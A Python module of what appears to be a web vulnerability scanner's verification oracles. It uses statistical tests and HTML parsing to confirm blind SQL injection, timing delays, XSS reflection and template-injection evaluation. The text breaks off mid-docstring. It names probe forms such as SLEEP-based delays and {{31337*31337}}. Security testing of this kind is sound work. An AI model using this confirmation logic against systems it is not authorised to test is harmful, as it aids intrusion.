"""
verify.oracles — pure, deterministic oracle functions.

Each oracle takes OBSERVED data (responses/state/output already collected by
someone else) and decides whether a real signal fired. Oracles are:

  * pure          — no I/O, no network, no clock, no randomness.
  * deterministic — same inputs, same OracleSignal, every time.
  * side-effect-free — they read, they judge, they return. They never send.

Confidence is calibrated so the verifier can gate on a single threshold.
Signal-combination inside an oracle uses a noisy-OR: independent corroborating
dimensions push confidence up, but no single weak dimension can dominate.
"""

from __future__ import annotations

import base64
import binascii
import difflib
import hashlib
import hmac
import json
import math
import re
from collections import Counter
from dataclasses import dataclass
from html.parser import HTMLParser
from statistics import median
from typing import Any, Mapping, Sequence

from .models import OracleKind, OracleSignal

# HTML void elements never get an end tag — popped from the path stack on start.
_VOID_ELEMENTS = frozenset({
    "area", "base", "br", "col", "embed", "hr", "img", "input",
    "link", "meta", "param", "source", "track", "wbr",
})


# ---------------------------------------------------------------------------
# Response normalisation (differential oracle)
# ---------------------------------------------------------------------------


@dataclass(frozen=True)
class _Response:
    status: int | None
    body: str
    latency_ms: float | None


def _coerce_text(value: Any) -> str:
    if value is None:
        return ""
    if isinstance(value, bytes):
        return value.decode("utf-8", errors="replace")
    if isinstance(value, str):
        return value
    return str(value)


def _normalize_response(value: Any) -> _Response:
    """Accept a plain string/bytes body, or a mapping with any of
    {status|status_code, body|text|content, latency_ms|elapsed_ms}."""
    if isinstance(value, Mapping):
        status = value.get("status", value.get("status_code"))
        body = value.get("body", value.get("text", value.get("content", "")))
        latency = value.get("latency_ms", value.get("elapsed_ms"))
        return _Response(
            status=int(status) if status is not None else None,
            body=_coerce_text(body),
            latency_ms=float(latency) if latency is not None else None,
        )
    return _Response(status=None, body=_coerce_text(value), latency_ms=None)


# ---------------------------------------------------------------------------
# Structural (AST) response signatures — invariant to token noise
# ---------------------------------------------------------------------------


def _json_signature(obj: Any, prefix: str = "") -> set[tuple[str, str]]:
    """The set of (json-pointer path, value-TYPE) pairs in a JSON document.
    Records structure, not values — so a changed timestamp/nonce (same path,
    same type) is invisible, but a new/removed record (a new path) shows."""
    out: set[tuple[str, str]] = set()
    if isinstance(obj, dict):
        out.add((prefix or "/", "object"))
        for k in obj:
            out |= _json_signature(obj[k], f"{prefix}/{k}")
    elif isinstance(obj, list):
        out.add((prefix or "/", "array"))
        for i, v in enumerate(obj):
            out |= _json_signature(v, f"{prefix}/{i}")
    else:
        out.add((prefix or "/", type(obj).__name__))
    return out


class _TagPathCounter(HTMLParser):
    """Builds a multiset of ancestor-tag-paths (e.g. ``html>body>table>tr``) over
    a document, using stdlib parsing only. The multiset is invariant to text/
    attribute values, so token noise does not move it, but an added element does."""

    def __init__(self) -> None:
        super().__init__(convert_charrefs=True)
        self._stack: list[str] = []
        self.counter: Counter[str] = Counter()

    def handle_starttag(self, tag: str, attrs: object) -> None:
        self._stack.append(tag)
        self.counter[">".join(self._stack)] += 1
        if tag in _VOID_ELEMENTS:
            self._stack.pop()

    def handle_startendtag(self, tag: str, attrs: object) -> None:
        self._stack.append(tag)
        self.counter[">".join(self._stack)] += 1
        self._stack.pop()

    def handle_endtag(self, tag: str) -> None:
        if tag in self._stack:
            while self._stack and self._stack[-1] != tag:
                self._stack.pop()
            if self._stack:
                self._stack.pop()


def _parse_structure(body: str) -> tuple[str, Any]:
    """Return ('json', path-type set) or ('html', tag-path multiset). JSON is
    tried first; anything else is parsed as HTML with the stdlib parser (no
    third-party dependency). A parse failure degrades to ('text', None) so the
    caller can skip cleanly."""
    import json as _json

    text = body if isinstance(body, str) else _coerce_text(body)
    stripped = text.lstrip()
    if stripped[:1] in "{[":
        try:
            return "json", _json_signature(_json.loads(text))
        except (ValueError, TypeError):
            pass
    parser = _TagPathCounter()
    try:
        parser.feed(text)
        parser.close()
    except Exception:
        return "text", None
    if not parser.counter:
        return "text", None
    return "html", parser.counter


def structural_diff(baseline_body: Any, mutated_body: Any) -> float:
    """A structure-aware divergence score in [0, 1], invariant to token noise
    (CSRF tokens, nonces, timestamps) and sensitive to real change (an added
    record, an extra ``<tr>``, a new form). 0 = structurally identical.

    JSON: symmetric difference of (path, type) sets over their union. HTML:
    multiset difference of tag-paths over the total. Different document kinds
    (JSON vs HTML) score 1.0. Unparseable bodies score 0.0 (no structural
    claim — the lexical dimension still applies)."""
    kind_b, sig_b = _parse_structure(baseline_body)
    kind_m, sig_m = _parse_structure(mutated_body)
    if kind_b == "text" or kind_m == "text":
        return 0.0
    if kind_b != kind_m:
        return 1.0
    if kind_b == "json":
        union = sig_b | sig_m
        return (len(sig_b ^ sig_m) / len(union)) if union else 0.0
    # html multisets
    diff = sum((sig_b - sig_m).values()) + sum((sig_m - sig_b).values())
    total = sum(sig_b.values()) + sum(sig_m.values())
    return (diff / total) if total else 0.0


def _noisy_or(weights: list[float]) -> float:
    """Combine independent evidence weights: 1 - prod(1 - w). Clamped to 0.99
    so a deterministic oracle never claims certainty it cannot have."""
    product = 1.0
    for w in weights:
        product *= 1.0 - max(0.0, min(1.0, w))
    return min(0.99, 1.0 - product)


# ---------------------------------------------------------------------------
# 1. Differential response — boolean- and time-based blind signals
# ---------------------------------------------------------------------------


def differential_response_oracle(
    baseline: Any,
    mutated: Any,
    discriminator: Mapping[str, Any] | str | None = None,
) -> OracleSignal:
    """Distinguish two observed responses.

    For a boolean-based blind bug the "true" condition yields a materially
    different response than the "false"/baseline condition; this oracle
    quantifies that divergence lexically and structurally. For a time-based
    blind bug a latency delta over threshold is the signal.

    discriminator (all optional):
      dimensions          : subset of {status,length,lexical,latency,marker}
      length_threshold    : min fractional length change to count (default 0.05)
      lexical_threshold   : min 1-similarity to count (default 0.10)
      latency_threshold_ms: min added latency to count (default 1000)
      true_marker         : string that must appear in `mutated` but not baseline
      expect              : "differ" (default) or "same"
    """
    if isinstance(discriminator, str):
        disc: dict[str, Any] = {"dimensions": [discriminator]}
    else:
        disc = dict(discriminator or {})

    b = _normalize_response(baseline)
    m = _normalize_response(mutated)

    wanted = set(disc.get("dimensions") or {"status", "length", "lexical", "latency", "marker"})
    length_thr = float(disc.get("length_threshold", 0.05))
    lexical_thr = float(disc.get("lexical_threshold", 0.10))
    latency_thr = float(disc.get("latency_threshold_ms", 1000.0))
    structural_thr = float(disc.get("structural_threshold", 0.02))
    true_marker = disc.get("true_marker")

    dims: list[dict[str, Any]] = []

    if "status" in wanted and b.status is not None and m.status is not None:
        differs = b.status != m.status
        dims.append({"dim": "status", "differs": differs, "weight": 0.6 if differs else 0.0,
                     "detail": f"{b.status} -> {m.status}"})

    if "length" in wanted:
        lb, lm = len(b.body), len(m.body)
        ratio = abs(lb - lm) / max(lb, lm, 1)
        differs = ratio > length_thr
        dims.append({"dim": "length", "differs": differs,
                     "weight": min(1.0, ratio) if differs else 0.0,
                     "detail": f"{lb} vs {lm} bytes ({ratio:.2%})"})

    if "lexical" in wanted:
        sim = difflib.SequenceMatcher(None, b.body, m.body).ratio()
        diff = 1.0 - sim
        differs = diff > lexical_thr
        dims.append({"dim": "lexical", "differs": differs,
                     "weight": diff if differs else 0.0,
                     "detail": f"similarity {sim:.2%}"})

    if "structural" in wanted:
        # AST-level divergence: invariant to nonce/CSRF/timestamp noise, so a
        # page that merely reflects a per-request token does NOT read as a diff,
        # while an added record / DOM node does. Higher precision than lexical.
        score = structural_diff(b.body, m.body)
        differs = score > structural_thr
        dims.append({"dim": "structural", "differs": differs,
                     "weight": min(1.0, score) if differs else 0.0,
                     "detail": f"structural delta {score:.2%}"})

    if "latency" in wanted and b.latency_ms is not None and m.latency_ms is not None:
        delta = m.latency_ms - b.latency_ms
        differs = delta >= latency_thr
        dims.append({"dim": "latency", "differs": differs,
                     "weight": 0.7 if differs else 0.0,
                     "detail": f"+{delta:.0f} ms"})

    if "marker" in wanted and true_marker:
        present = true_marker in m.body and true_marker not in b.body
        dims.append({"dim": "marker", "differs": present,
                     "weight": 0.9 if present else 0.0,
                     "detail": f"true_marker {'present' if present else 'absent'}"})

    differing = [d for d in dims if d["differs"]]
    diff_conf = _noisy_or([d["weight"] for d in differing])

    expect = disc.get("expect", "differ")
    if expect == "same":
        fired = len(differing) == 0 and len(dims) > 0
        confidence = min(0.99, 1.0 - diff_conf) if fired else 0.0
        evidence = ("responses indistinguishable across "
                    + ", ".join(d["dim"] for d in dims)) if fired else (
            "responses diverge on " + ", ".join(d["dim"] for d in differing))
    else:
        fired = len(differing) > 0
        confidence = diff_conf if fired else 0.0
        evidence = ("responses diverge on "
                    + ", ".join(f"{d['dim']} ({d['detail']})" for d in differing)) if fired else (
            "responses indistinguishable")

    return OracleSignal(
        kind=OracleKind.DIFFERENTIAL_RESPONSE,
        fired=fired,
        confidence=confidence,
        evidence=evidence,
        observed={"dimensions": dims, "expect": expect},
    )


# ---------------------------------------------------------------------------
# 1b. Timing — statistical time-based blind (a real hypothesis test)
# ---------------------------------------------------------------------------


def _normal_cdf(z: float) -> float:
    """Standard-normal CDF via erf (pure stdlib)."""
    return 0.5 * (1.0 + math.erf(z / math.sqrt(2.0)))


def _rank_average(values: Sequence[float]) -> tuple[list[float], list[int]]:
    """Average (fractional) ranks of ``values`` and the sizes of each tie group.

    Ties share the mean of the ranks they would occupy — the standard
    correction, so the Mann-Whitney statistic is exact under ties."""
    order = sorted(range(len(values)), key=lambda i: values[i])
    ranks = [0.0] * len(values)
    tie_sizes: list[int] = []
    i = 0
    n = len(values)
    while i < n:
        j = i
        while j + 1 < n and values[order[j + 1]] == values[order[i]]:
            j += 1
        avg = (i + j) / 2.0 + 1.0  # ranks are 1-based
        for k in range(i, j + 1):
            ranks[order[k]] = avg
        if j > i:
            tie_sizes.append(j - i + 1)
        i = j + 1
    return ranks, tie_sizes


def _mann_whitney(baseline: Sequence[float], treatment: Sequence[float]) -> tuple[float, float]:
    """One-sided Mann-Whitney U for H1: treatment stochastically GREATER than
    baseline. Returns (z, p_value) using the normal approximation with tie and
    continuity correction. p is the probability of a U this extreme under H0
    (no location shift). Small samples still get an honest — if conservative —
    normal-approximation p; there is no exact-distribution table here."""
    n1, n2 = len(baseline), len(treatment)
    if n1 == 0 or n2 == 0:
        return 0.0, 1.0
    ranks, tie_sizes = _rank_average(list(baseline) + list(treatment))
    r_treat = sum(ranks[n1:])
    u_treat = r_treat - n2 * (n2 + 1) / 2.0
    mu = n1 * n2 / 2.0
    n = n1 + n2
    tie_term = sum(t ** 3 - t for t in tie_sizes)
    var = (n1 * n2 / 12.0) * ((n + 1) - tie_term / (n * (n - 1))) if n > 1 else 0.0
    if var <= 0.0:
        # Zero variance: either everything tied (no signal) or perfectly
        # separated with n too small — treat as no usable statistic.
        return 0.0, 1.0
    sigma = math.sqrt(var)
    # continuity correction toward the null
    z = (u_treat - mu - 0.5) / sigma
    p = 1.0 - _normal_cdf(z)
    return z, p


def _hodges_lehmann(baseline: Sequence[float], treatment: Sequence[float]) -> float:
    """The Hodges-Lehmann estimator of the median shift (treatment - baseline):
    the median of all pairwise differences. A robust effect-size measure that
    resists outliers (one slow request cannot manufacture a shift)."""
    diffs = [t - b for t in treatment for b in baseline]
    return median(diffs) if diffs else 0.0


def timing_oracle(
    baseline_samples: Any,
    treatment_samples: Any,
    *,
    injected_ms: float | None = None,
    alpha: float = 0.01,
    effect_floor_fraction: float = 0.5,
    absolute_floor_ms: float = 250.0,
    min_samples: int = 5,
    dose: Mapping[str, Any] | None = None,
) -> OracleSignal:
    """Confirm a time-based blind vulnerability with a real hypothesis test.

    A single averaged comparison or a fixed latency threshold (what sqlmap/Burp
    largely do) false-positives under jitter and false-negatives under load.
    This fires only when ALL of the following hold, which together are robust to
    both:

      1. **Rank-sum test.** A one-sided Mann-Whitney U rejects H0 (no shift) at
         ``alpha`` — the delay-injected requests are stochastically slower, by a
         distribution-free test that does not assume Gaussian latencies.
      2. **Effect-size floor.** The Hodges-Lehmann median shift is at least
         ``effect_floor_fraction`` of the injected delay (or ``absolute_floor_ms``
         when the delay is unknown) — a statistically-significant-but-tiny shift
         (network drift) is refused.
      3. **Dose-response (optional).** When ``dose`` supplies a second treatment
         at a different delay, the observed shift must scale with the injected
         delay (e.g. SLEEP(2) ~= 2x SLEEP(1)) — a constant offset cannot fake
         this. ``dose = {"low_ms": .., "low_samples": [..], "high_ms": .., "high_samples": [..]}``.

    Deterministic and pure: given the same samples it returns the same signal.
    """
    base = [float(x) for x in (baseline_samples or [])]
    treat = [float(x) for x in (treatment_samples or [])]
    if len(base) < min_samples or len(treat) < min_samples:
        return OracleSignal(
            kind=OracleKind.TIMING, fired=False, confidence=0.0,
            evidence=f"insufficient samples ({len(base)}/{len(treat)}, need >= {min_samples} each)",
            observed={"n_baseline": len(base), "n_treatment": len(treat)},
        )

    z, p = _mann_whitney(base, treat)
    shift = _hodges_lehmann(base, treat)
    floor = (effect_floor_fraction * injected_ms) if injected_ms else absolute_floor_ms

    reject = p < alpha
    effect_ok = shift >= floor

    dose_ok = True
    dose_detail = ""
    dose_conf = 0.0
    if dose is not None:
        low = [float(x) for x in (dose.get("low_samples") or [])]
        high = [float(x) for x in (dose.get("high_samples") or [])]
        low_ms = float(dose.get("low_ms", 0.0) or 0.0)
        high_ms = float(dose.get("high_ms", 0.0) or 0.0)
        if len(low) >= min_samples and len(high) >= min_samples and low_ms > 0 and high_ms > low_ms:
            low_shift = _hodges_lehmann(base, low)
            high_shift = _hodges_lehmann(base, high)
            expected_ratio = high_ms / low_ms
            observed_ratio = (high_shift / low_shift) if low_shift > 0 else 0.0
            # The observed shift must actually SCALE with the injected delay. A
            # constant offset (a slow proxy) gives ratio ~1.0 regardless; a real
            # dose gives ~expected_ratio. Require the ratio to sit above the
            # halfway point between "no scaling" (1) and full scaling, and not
            # wildly overshoot — so ratio 1.0 is refused, ratio ~expected passes.
            lower = 1.0 + 0.5 * (expected_ratio - 1.0)
            upper = 1.5 * expected_ratio
            dose_ok = lower <= observed_ratio <= upper
            dose_conf = 0.9 if dose_ok else 0.0
            dose_detail = f"; dose ratio {observed_ratio:.2f} vs expected {expected_ratio:.2f}"
        else:
            dose_ok = True  # malformed dose spec: do not penalise, just don't corroborate

    fired = reject and effect_ok and dose_ok

    if not fired:
        why = []
        if not reject:
            why.append(f"rank-sum p={p:.4g} >= alpha={alpha}")
        if not effect_ok:
            why.append(f"median shift {shift:.0f}ms < floor {floor:.0f}ms")
        if not dose_ok:
            why.append("dose-response failed")
        return OracleSignal(
            kind=OracleKind.TIMING, fired=False, confidence=0.0,
            evidence="no timing signal: " + "; ".join(why),
            observed={"z": z, "p_value": p, "median_shift_ms": shift, "floor_ms": floor},
        )

    p_conf = min(0.9, 1.0 - p)
    eff_conf = min(0.85, shift / injected_ms) if injected_ms else min(0.85, shift / (floor * 2))
    confidence = _noisy_or([p_conf, eff_conf, dose_conf])
    return OracleSignal(
        kind=OracleKind.TIMING,
        fired=True,
        confidence=confidence,
        evidence=(
            f"delay-injected requests are slower (Mann-Whitney z={z:.2f}, p={p:.3g}); "
            f"median shift {shift:.0f}ms >= floor {floor:.0f}ms{dose_detail}"
        ),
        observed={
            "z": z, "p_value": p, "median_shift_ms": shift, "floor_ms": floor,
            "n_baseline": len(base), "n_treatment": len(treat), "dose_ok": dose_ok,
        },
    )


def _sprt_decision(
    signals: Any,
    *,
    alpha: float,
    beta: float,
    p1: float,
    p0: float,
) -> tuple[str | None, float, int, int, float, float]:
    """The Wald SEQUENTIAL PROBABILITY RATIO TEST core, factored out so more than one oracle can
    share the SAME sequential test (``boolean_inference_oracle`` and ``credential_stuffing_oracle``).

    ``signals`` is an ITERABLE of bools consumed LAZILY: the loop stops pulling from the iterable
    at the first boundary, so a generator that computes each Bernoulli signal on demand does no
    work past the decision (this keeps ``boolean_inference_oracle`` byte-identical to its old
    inline loop — the same per-round work, in the same order, stopping at the same round).

    Returns ``(decided, llr, n_used, n_signal, upper, lower)`` where ``decided`` is ``"confirm"``
    (LLR >= log((1-beta)/alpha)), ``"refute"`` (LLR <= log(beta/(1-alpha))), or ``None`` (no
    boundary reached — inconclusive, a non-fire, never a guess). Pure + deterministic."""
    upper = math.log((1.0 - beta) / alpha)
    lower = math.log(beta / (1.0 - alpha))
    llr = 0.0
    n_used = 0
    n_signal = 0
    decided: str | None = None
    for sig in signals:
        n_used += 1
        n_signal += 1 if sig else 0
        llr += math.log(p1 / p0) if sig else math.log((1.0 - p1) / (1.0 - p0))
        if llr >= upper:
            decided = "confirm"
            break
        if llr <= lower:
            decided = "refute"
            break
    return decided, llr, n_used, n_signal, upper, lower


def boolean_inference_oracle(
    probe_rounds: Any,
    *,
    alpha: float = 0.05,
    beta: float = 0.05,
    p1: float = 0.9,
    p0: float = 0.1,
    discriminator: Mapping[str, Any] | str | None = None,
) -> OracleSignal:
    """Confirm a boolean-blind vulnerability by a Wald SEQUENTIAL PROBABILITY
    RATIO TEST over repeated probes — robust to the nondeterministic backends
    (caching, load-dependent bodies, per-request tokens) that make a single
    true/false comparison produce Burp-style "Tentative" false positives.

    Each round carries three observed responses: a TRUE-clause response, and two
    FALSE-clause responses. The per-round Bernoulli signal is

        (TRUE differs from FALSE)  AND  (the two FALSE responses agree)

    — the first half is the boolean signal; the second is a *dynamic-page
    control* that a naive repeated-differential lacks. A real injection makes the
    true clause change the response while the false clause stays stable (signal
    1); a page that simply changes every request trips the control (signal 0), so
    it cannot masquerade as a bug.

    SPRT accumulates the log-likelihood ratio that the signal rate is ``p1``
    (vulnerable) vs ``p0`` (noise) and stops at the first boundary: LLR >=
    log((1-beta)/alpha) confirms; LLR <= log(beta/(1-alpha)) refutes; neither by
    the last round is inconclusive (a non-fire — never a guess). ``probe_rounds``
    is ``[{"true": resp, "false_a": resp, "false_b": resp}, ...]``.
    """
    def _round_signals():
        for r in (probe_rounds or []):
            if not isinstance(r, Mapping) or "true" not in r or "false_a" not in r or "false_b" not in r:
                continue
            across = differential_response_oracle(r["false_a"], r["true"], discriminator).fired
            within_same = not differential_response_oracle(r["false_a"], r["false_b"], discriminator).fired
            yield bool(across and within_same)

    decided, llr, n_used, signals, upper, lower = _sprt_decision(
        _round_signals(), alpha=alpha, beta=beta, p1=p1, p0=p0)

    observed = {
        "rounds_used": n_used, "signal_rounds": signals, "llr": llr,
        "upper": upper, "lower": lower, "decision": decided or "inconclusive",
    }
    if decided == "confirm":
        # confidence reflects the controlled type-I error rate of the test
        confidence = min(0.99, 1.0 - alpha)
        return OracleSignal(
            kind=OracleKind.BOOLEAN_INFERENCE, fired=True, confidence=confidence,
            evidence=(
                f"SPRT confirmed boolean inference in {n_used} round(s): "
                f"{signals} separable (true!=false, false stable), LLR={llr:.2f} >= {upper:.2f}"
            ),
            observed=observed,
        )
    reason = "refuted (indistinguishable)" if decided == "refute" else "inconclusive (no boundary reached)"
    return OracleSignal(
        kind=OracleKind.BOOLEAN_INFERENCE, fired=False, confidence=0.0,
        evidence=f"SPRT {reason} after {n_used} round(s): LLR={llr:.2f} in ({lower:.2f}, {upper:.2f})",
        observed=observed,
    )


def holm_correction(p_values: Sequence[float], alpha: float = 0.01) -> list[bool]:
    """Holm-Bonferroni step-down over ``m`` simultaneous timing tests (one per
    candidate parameter). Returns, per input p-value, whether it rejects at
    family-wise error rate ``alpha``. Probing many params at once inflates false
    positives; Holm controls that without the raw Bonferroni's loss of power."""
    m = len(p_values)
    if m == 0:
        return []
    order = sorted(range(m), key=lambda i: p_values[i])
    reject = [False] * m
    for rank, idx in enumerate(order):
        if p_values[idx] <= alpha / (m - rank):
            reject[idx] = True
        else:
            break  # step-down: once one fails to reject, all larger p-values do too
    return reject


# ---------------------------------------------------------------------------
# 2. Achieved state — an unauthorized record/state became reachable
# ---------------------------------------------------------------------------


def _resolve_operand(operand: Any, observed: Mapping[str, Any]) -> Any:
    """A predicate operand is either a variable reference ``{"var": "name"}``
    (looked up in the observed evidence) or a literal (str/int/list/...)."""
    if isinstance(operand, Mapping) and set(operand.keys()) == {"var"}:
        return observed.get(operand["var"])
    return operand


def _eval_predicate(pred: Any, observed: Mapping[str, Any]) -> tuple[bool, str]:
    """Evaluate one declarative predicate node over the observed evidence and
    return (holds, human-readable evidence). The predicate is a tiny, pure,
    JSON-serialisable AST — no code, so a certificate stays re-verifiable. Ops:
    all/any/not, eq/ieq, contains/icontains, in, min_len, gt/ge."""
    if not isinstance(pred, Mapping) or len(pred) != 1:
        raise ValueError(f"predicate node must be a single-op mapping, got {pred!r}")
    op, args = next(iter(pred.items()))

    if op == "all":
        results = [_eval_predicate(p, observed) for p in args]
        return all(r[0] for r in results), " AND ".join(f"({r[1]})" for r in results)
    if op == "any":
        results = [_eval_predicate(p, observed) for p in args]
        return any(r[0] for r in results), " OR ".join(f"({r[1]})" for r in results)
    if op == "not":
        r = _eval_predicate(args, observed)
        return (not r[0]), f"NOT({r[1]})"

    a = _resolve_operand(args[0], observed)
    if op in ("eq", "ieq", "contains", "icontains", "in", "min_len", "gt", "ge"):
        b = _resolve_operand(args[1], observed) if len(args) > 1 else None
    if op == "eq":
        return a == b, f"{a!r} == {b!r}"
    if op == "ieq":
        return str(a).lower() == str(b).lower(), f"{a!r} =(ci) {b!r}"
    if op == "contains":
        ok = bool(a) and bool(b) and str(b) in str(a)
        return ok, f"{b!r} in <{len(str(a))}b body>"
    if op == "icontains":
        ok = bool(a) and bool(b) and str(b).lower() in str(a).lower()
        return ok, f"{b!r} in(ci) <{len(str(a))}b body>"
    if op == "in":
        return a in (b or []), f"{a!r} in {b!r}"
    if op == "min_len":
        return len(str(a or "")) >= int(b), f"len({a!r})>={b}"
    if op == "gt":
        return (a is not None and b is not None and a > b), f"{a!r} > {b!r}"
    if op == "ge":
        return (a is not None and b is not None and a >= b), f"{a!r} >= {b!r}"
    raise ValueError(f"unknown predicate op {op!r}")


def predicate_oracle(observed_evidence: Mapping[str, Any], predicate: Any) -> OracleSignal:
    """Evaluate a dangerous CONDITION over RAW observed values — the fix for the
    achieved-state rubber-stamp.

    The old pattern had each state check (CORS/host-header/redirect/JWT/IDOR/race)
    compute a boolean in Python and pass ``{"k": True}`` vs ``{"k": that_boolean}``
    to ``achieved_state_oracle``, which merely re-asserted the check's own verdict.
    Here the check hands over the ACTUAL observed values (header values, both
    identities' bodies, the accepted/rejected statuses, the concurrent successes)
    plus a declarative predicate, and THIS oracle decides — emitting evidence that
    cites the values it judged. The predicate is a pure JSON AST, so the finding's
    certificate re-verifies offline exactly like every other oracle."""
    observed = dict(observed_evidence or {})
    try:
        fired, evidence = _eval_predicate(predicate, observed)
    except (ValueError, TypeError) as e:
        return OracleSignal(
            kind=OracleKind.ACHIEVED_STATE, fired=False, confidence=0.0,
            evidence=f"malformed predicate: {e}", observed={"predicate": predicate})
    return OracleSignal(
        kind=OracleKind.ACHIEVED_STATE,
        fired=fired,
        confidence=0.9 if fired else 0.0,
        evidence=(f"dangerous condition holds over observed values: {evidence}"
                  if fired else f"condition not met: {evidence}"),
        observed={"predicate_eval": evidence, "values": observed},
    )


def achieved_state_oracle(
    expected_state: Mapping[str, Any],
    observed_state: Mapping[str, Any],
) -> OracleSignal:
    """Fire when every key/value the attacker predicted appears in the
    observed state — e.g. `{"owner": "victim", "readable": True}` shows up in
    a record that should have been denied. A full match of a non-empty
    expectation is a strong signal; a partial match is informational only."""
    expected = dict(expected_state or {})
    observed = dict(observed_state or {})

    if not expected:
        return OracleSignal(
            kind=OracleKind.ACHIEVED_STATE, fired=False, confidence=0.0,
            evidence="no expected state supplied", observed={"expected": expected})

    matched = {k: v for k, v in expected.items() if k in observed and observed[k] == v}
    mismatched = {k: v for k, v in expected.items() if k not in matched}
    full = len(matched) == len(expected)

    confidence = 0.9 if full else (len(matched) / len(expected)) * 0.5
    evidence = (
        f"achieved all {len(expected)} expected field(s): "
        + ", ".join(f"{k}={v!r}" for k, v in matched.items())
        if full else
        f"only {len(matched)}/{len(expected)} expected field(s) matched"
    )
    return OracleSignal(
        kind=OracleKind.ACHIEVED_STATE,
        fired=full,
        confidence=confidence,
        evidence=evidence,
        observed={"matched": matched, "mismatched": mismatched},
    )


# ---------------------------------------------------------------------------
# 3. Side effect — a unique marker surfaced in a sink it should never reach
# ---------------------------------------------------------------------------


def _searchable(sink: Any) -> str:
    if isinstance(sink, Mapping):
        return "\n".join(f"{k}={_coerce_text(v)}" for k, v in sink.items())
    if isinstance(sink, (list, tuple)):
        return "\n".join(_coerce_text(x) for x in sink)
    return _coerce_text(sink)


def side_effect_oracle(marker: str, observed_sink: Any) -> OracleSignal:
    """Fire when a unique, attacker-chosen marker appears somewhere it should
    not — a reflected/stored XSS canary in rendered output, an SSTI evaluation
    result, a log line, a filesystem read. The marker must be non-trivial
    (>= 4 chars) so we do not confirm on incidental substrings."""
    marker = (marker or "").strip()
    haystack = _searchable(observed_sink)

    if len(marker) < 4:
        return OracleSignal(
            kind=OracleKind.SIDE_EFFECT, fired=False, confidence=0.0,
            evidence="marker too short to be a reliable canary",
            observed={"marker": marker})

    idx = haystack.find(marker)
    if idx < 0:
        return OracleSignal(
            kind=OracleKind.SIDE_EFFECT, fired=False, confidence=0.0,
            evidence=f"marker {marker!r} not present in sink",
            observed={"marker": marker})

    start = max(0, idx - 24)
    snippet = haystack[start: idx + len(marker) + 24]
    return OracleSignal(
        kind=OracleKind.SIDE_EFFECT,
        fired=True,
        confidence=0.9,
        evidence=f"marker {marker!r} reached sink: ...{snippet}...",
        observed={"marker": marker, "offset": idx, "snippet": snippet},
    )


# ---------------------------------------------------------------------------
# 3b. Reflection context — a marker reached an EXECUTABLE HTML/JS position
# ---------------------------------------------------------------------------


class _ReflectionScanner(HTMLParser):
    """Locate a marker's parse context with stdlib HTML parsing. Fires internal
    state when the marker became (part of) a tag name, landed inside a
    ``<script>``, or sits in an event-handler / ``javascript:`` attribute value.
    ``convert_charrefs=True`` means an HTML-encoded payload arrives as inert TEXT
    (not a tag), so it is correctly judged non-executable."""

    def __init__(self, marker_lower: str) -> None:
        super().__init__(convert_charrefs=True)
        self._ml = marker_lower
        self._in_script = False
        self.context: str | None = None
        self.detail: str = ""

    def handle_starttag(self, tag: str, attrs: list[tuple[str, str | None]]) -> None:
        if self.context is not None:
            return
        if self._ml in tag.lower():
            self.context, self.detail = "html_tag", tag
            return
        if tag.lower() == "script":
            self._in_script = True
        for name, val in attrs:
            v = (val or "").lower()
            if self._ml not in v:
                continue
            a = name.lower()
            if a.startswith("on") or (a in ("href", "src", "action", "formaction")
                                      and v.lstrip().startswith("javascript:")):
                self.context, self.detail = f"js_attribute:{name}", name
                return

    def handle_startendtag(self, tag: str, attrs: list[tuple[str, str | None]]) -> None:
        self.handle_starttag(tag, attrs)

    def handle_endtag(self, tag: str) -> None:
        if tag.lower() == "script":
            self._in_script = False

    def handle_data(self, data: str) -> None:
        if self.context is None and self._in_script and self._ml in data.lower():
            self.context = "script"


def reflection_context_oracle(marker: str, observed_sink: Any) -> OracleSignal:
    """Fire only when a reflected marker lands in an EXECUTABLE position — the
    payload broke out of its context into live markup or script — not merely when
    the marker substring is present.

    Substring-presence (what ``side_effect_oracle`` and most DAST use for XSS)
    over-reports: a marker reflected inside an HTML-encoded attribute, a comment,
    or plain text is inert. Here the response is PARSED (stdlib, no third-party
    dependency), and a signal fires only if the marker became (part of) a tag
    name (the payload created an element), landed inside a ``<script>``, or sits
    in an event-handler / ``javascript:`` attribute. An encoded or text-only
    reflection does not fire — materially fewer false positives than substring
    XSS detection."""
    marker = (marker or "").strip()
    body = observed_sink if isinstance(observed_sink, str) else _searchable(observed_sink)
    if len(marker) < 4:
        return OracleSignal(
            kind=OracleKind.REFLECTION_CONTEXT, fired=False, confidence=0.0,
            evidence="marker too short to be a reliable canary", observed={"marker": marker})
    ml = marker.lower()
    if ml not in body.lower():
        return OracleSignal(
            kind=OracleKind.REFLECTION_CONTEXT, fired=False, confidence=0.0,
            evidence=f"marker {marker!r} not reflected", observed={"marker": marker})

    scanner = _ReflectionScanner(ml)
    try:
        scanner.feed(body)
        scanner.close()
    except Exception:
        scanner.context = None

    if scanner.context == "html_tag":
        return OracleSignal(
            kind=OracleKind.REFLECTION_CONTEXT, fired=True, confidence=0.95,
            evidence=f"marker created a live element <{scanner.detail}> — executable HTML injection",
            observed={"marker": marker, "context": "html_tag", "tag": scanner.detail})
    if scanner.context == "script":
        return OracleSignal(
            kind=OracleKind.REFLECTION_CONTEXT, fired=True, confidence=0.9,
            evidence="marker reflected inside a <script> block — executable JS context",
            observed={"marker": marker, "context": "script"})
    if scanner.context and scanner.context.startswith("js_attribute"):
        return OracleSignal(
            kind=OracleKind.REFLECTION_CONTEXT, fired=True, confidence=0.9,
            evidence=f"marker in executable attribute {scanner.detail!r} — event/JS URL context",
            observed={"marker": marker, "context": scanner.context})

    return OracleSignal(
        kind=OracleKind.REFLECTION_CONTEXT, fired=False, confidence=0.0,
        evidence="marker reflected but NOT in an executable context (encoded/inert)",
        observed={"marker": marker, "context": "inert"})


# ---------------------------------------------------------------------------
# 3c. Evaluation — the server EVALUATED an injected expression (SSTI / EL)
# ---------------------------------------------------------------------------


def evaluation_oracle(
    raw_expr: str,
    expected_result: str,
    observed_body: Any,
    control_body: Any = None,
) -> OracleSignal:
    """Fire when an injected expression was **evaluated** by the server, not
    merely reflected — the signature of server-side template / expression-language
    injection (Jinja2/Twig/Freemarker/Velocity/ERB/Smarty/Mako/Thymeleaf, EL).

    The proof is deliberately strict, because "reflected" and "evaluated" look
    identical unless you separate them:

      1. the ``expected_result`` (what ``raw_expr`` computes to, e.g. ``31337*31337
         -> 981538969``) appears in the response, AND
      2. the ``raw_expr`` itself (``{{31337*31337}}``) does NOT appear — if the
         raw template text survives, the input was reflected verbatim, not
         evaluated, so this is NOT SSTI, AND
      3. when a benign ``control_body`` is supplied, the ``expected_result`` does
         NOT occur in it — so a value that merely happens to be on the page can
